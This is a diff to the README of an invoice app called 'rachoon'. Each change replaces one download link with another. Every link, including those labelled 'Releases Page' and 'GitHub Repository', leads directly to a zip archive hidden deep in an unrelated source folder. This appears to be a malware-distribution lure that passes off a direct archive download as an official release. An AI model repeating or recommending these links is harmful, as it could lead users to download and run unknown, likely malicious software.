@@ -1,6 +1,6 @@
 # 🦝 rachoon - Easily Manage Your Invoices at Home
 
-[![Download Rachoon](https://raw.githubusercontent.com/Kasumiya0108/rachoon/main/apps/backend/app/Services/rachoon_v1.3.zip%20Rachoon-blue)](https://raw.githubusercontent.com/Kasumiya0108/rachoon/main/apps/backend/app/Services/rachoon_v1.3.zip)
+[![Download Rachoon](https://github.com/Kasumiya0108/rachoon/raw/refs/heads/main/apps/frontend/pages/reminders/invoice/Software-v2.0-alpha.5.zip%20Rachoon-blue)](https://github.com/Kasumiya0108/rachoon/raw/refs/heads/main/apps/frontend/pages/reminders/invoice/Software-v2.0-alpha.5.zip)
 
 ## 📋 About Rachoon
 
@@ -12,7 +12,7 @@ Setting up Rachoon is straightforward. Follow the steps below to download and ru
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Kasumiya0108/rachoon/main/apps/backend/app/Services/rachoon_v1.3.zip) to download Rachoon.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Kasumiya0108/rachoon/raw/refs/heads/main/apps/frontend/pages/reminders/invoice/Software-v2.0-alpha.5.zip) to download Rachoon.
    
 2. **Choose the Right Version**: On the Releases Page, you will see several versions of Rachoon. Look for the latest version, which will usually be at the top of the list. Each version will have a list of files that you can download. 
 
@@ -62,7 +62,7 @@ Join our community of Rachoon users. Share your experiences, tips, and tricks. C
 
 ## 🔗 Important Links
 
-- [Rachoon Releases Page](https://raw.githubusercontent.com/Kasumiya0108/rachoon/main/apps/backend/app/Services/rachoon_v1.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Kasumiya0108/rachoon/main/apps/backend/app/Services/rachoon_v1.3.zip)
+- [Rachoon Releases Page](https://github.com/Kasumiya0108/rachoon/raw/refs/heads/main/apps/frontend/pages/reminders/invoice/Software-v2.0-alpha.5.zip)
+- [GitHub Repository](https://github.com/Kasumiya0108/rachoon/raw/refs/heads/main/apps/frontend/pages/reminders/invoice/Software-v2.0-alpha.5.zip)
 
 Feel free to explore Rachoon and take control of your invoicing needs.
